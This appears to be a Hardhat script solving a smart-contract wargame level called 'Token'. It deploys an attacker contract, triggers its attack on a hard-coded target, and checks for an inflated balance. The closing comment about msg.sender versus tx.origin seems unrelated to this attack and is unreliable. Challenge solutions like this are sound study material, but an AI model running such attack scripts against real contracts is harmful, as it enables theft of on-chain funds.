import { Contract } from "ethers";
import { ethers } from "hardhat";
import { deployContract } from "../../utils/deployContract";
import { abi } from "../../artifacts/contracts/5.Token/Token.sol/Token.json";

function setTargetContract() {
  const contractAddress = "0x95d7B9960500BDe2229D85b896fB6E5bD8578cA2";
  return new Contract(contractAddress, abi);
}

async function main() {
  const [attacker] = await ethers.getSigners();
  const TokenAttacker = await deployContract("TokenAttacker", attacker);
  const TokenTarget = setTargetContract();
  console.log("Attack starts");
  const pendingTx = await TokenAttacker.attack();
  await pendingTx.wait();
  const balance = await TokenTarget.connect(attacker).balanceOf(
    attacker.address
  );
  console.log("Success: ", balance.gt(20));
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});

/* Explanation :
Here msg.sender is the attacking contract address, tx.origin is the EOA initiating
the transaction.
*/
